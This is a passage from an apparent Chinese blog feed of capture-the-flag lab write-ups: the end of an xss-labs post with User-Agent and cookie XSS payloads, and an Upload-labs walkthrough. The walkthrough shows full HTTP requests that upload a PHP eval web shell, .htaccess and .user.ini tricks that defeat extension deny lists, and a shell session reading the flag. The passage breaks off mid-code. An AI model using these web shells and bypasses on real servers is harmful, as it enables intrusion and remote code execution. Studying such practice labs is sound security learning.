src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175032662.png" alt="image-20240223175032662"></p><p>这里又多出来一个t_ua 不必多说, User-Agent注入</p><p>修改User-Agent即可</p><p><code>User-Agent: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175138909.png" alt="image-20240223175138909"></p><h2 id="level-13-cookie注入"><a href="#level-13-cookie注入" class="headerlink" title="level 13(cookie注入)"></a>level 13(cookie注入)</h2><p>这里抓包会发现带了一个cookie, 返回内容t_cook中的内容正好是cookie中的内容</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175436189.png" alt="image-20240223175436189"></p><p>更改cookie中的内容为前两关的payload即可</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223175555490.png" alt="image-20240223175555490"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-labs&quot;&gt;&lt;a href=&quot;#xss-labs&quot; class=&quot;headerlink&quot; title=&quot;xss-labs&quot;&gt;&lt;/a&gt;xss-labs&lt;/h1&gt;&lt;p&gt;手动搭建了一个本地靶场&lt;/p&gt;
&lt;p&gt;原github项目地址&lt;/p&gt;
&lt;p&gt;&lt;a href=</summary>
      
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs</title>
    <link href="http://example.com/2024/02/19/Upload-labs/"/>
    <id>http://example.com/2024/02/19/Upload-labs/</id>
    <published>2024-02-19T13:40:48.000Z</published>
    <updated>2024-02-23T07:59:31.647Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><p>网上有21关的和20关两种,在这里以buu upload-labs linux 也就是20关的来排序,并且在本地搭建了21关的labs</p><p>即包含了21关全部内容</p><h2 id="Pass-01-前端验证"><a href="#Pass-01-前端验证" class="headerlink" title="Pass-01(前端验证)"></a>Pass-01(前端验证)</h2><p>简单的前端js验证</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-01/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>316</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryKhKT7v8SLthN7HCS</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d6201cdc-7e17-4a35-8198-4b2a83f9aded.node5.buuoj.cn:81/Pass-01/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[nacl]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryKhKT7v8SLthN7HCS--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>之后蚁剑连接即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(*) 基础信息</span><br><span class="line">当前路径: /var/www/html/upload</span><br><span class="line">磁盘列表: /</span><br><span class="line">系统信息: Linux out 4.19.221-0419221-generic <span class="comment">#202112141049 SMP Tue Dec 14 11:54:51 UTC 2021 x86_64</span></span><br><span class="line">当前用户: www-data</span><br><span class="line">(*) 输入 ashelp 查看本地命令</span><br><span class="line">(www-data:/var/www/html/upload) $ <span class="built_in">cd</span> /</span><br><span class="line">(www-data:/) $ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">init-scripts</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/) $ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;2e4c9e92-0a87-448f-816b-7dd80815b03e&#125;</span><br><span class="line">(www-data:/) $</span><br></pre></td></tr></table></figure><h2 id="Pass-02-MIME绕过"><a href="#Pass-02-MIME绕过" class="headerlink" title="Pass-02(MIME绕过)"></a>Pass-02(MIME绕过)</h2><p>此题为mime绕过,由于第一题我们也将mime更改了所以与第一题poc相同</p><h2 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03(黑名单绕过)"></a>Pass-03(黑名单绕过)</h2><p>这关为黑名单验证,但是黑名单并不全</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里可以使用.phtml等绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220135850240.png" alt="image-20240220135850240"></p><h2 id="Pass-04-htaccess绕过黑名单"><a href="#Pass-04-htaccess绕过黑名单" class="headerlink" title="Pass-04(.htaccess绕过黑名单)"></a>Pass-04(.htaccess绕过黑名单)</h2><p>仍然是黑名单,但是增加了不少php的后缀,不过可以可以上传.htaccess来绕过</p><p>.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line"></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php?action=show_code</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>380</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryAlCaT8MY9dXGKBFo</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.htaccess&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;FilesMatch &quot;png&quot;&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">  SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">上传</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarycJmFOOAI4Dq9bwue</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.png&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220141436068.png" alt="image-20240220141436068"></p><h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05(大小写绕过)"></a>Pass-05(大小写绕过)</h2><p>又禁了.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p>虽然没有禁.php7但是这里上传.php7并不能被解析</p><p>查看源码与前几关对比 发现这里并没有下面这行 将文件后缀名统一转换为小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>所以我们可以上传.phP来绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142700111.png" alt="image-20240220142700111"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142713513.png" alt="image-20240220142713513"></p><h2 id="buu-upload-labs-windows-Pass-05-user-ini绕过"><a href="#buu-upload-labs-windows-Pass-05-user-ini绕过" class="headerlink" title="(buu upload-labs windows)Pass-05(.user.ini绕过)"></a>(buu upload-labs windows)Pass-05(.user.ini绕过)</h2><p>这关在BUU upload-labs windows中,禁了.htaccess</p><p>但在upload&#x2F;下存在一个readme.php, 并且没有禁.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220145259013.png" alt="image-20240220145259013"></p><p>因此可以构造.user.ini来使readme.php包含我们上传的恶意文件</p><blockquote><p> php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。 </p><p><strong>实例</strong></p><p>php 配置项中有两个配置可以起到一些作用</p><blockquote><p>auto_prepend_file &#x3D; <filename>     &#x2F;&#x2F;包含在文件头<br>auto_append_file &#x3D; <filename>      &#x2F;&#x2F;包含在文件尾</p></blockquote><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg</span><br></pre></td></tr></table></figure><p>1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></blockquote><p>这里buu的window upload-labs靶机似乎有点问题,所以我就在本地window环境搭建了一个靶机进行测试</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>332</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary04B3H7j2HCxrhZa6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = shell.jpg</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">上传</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 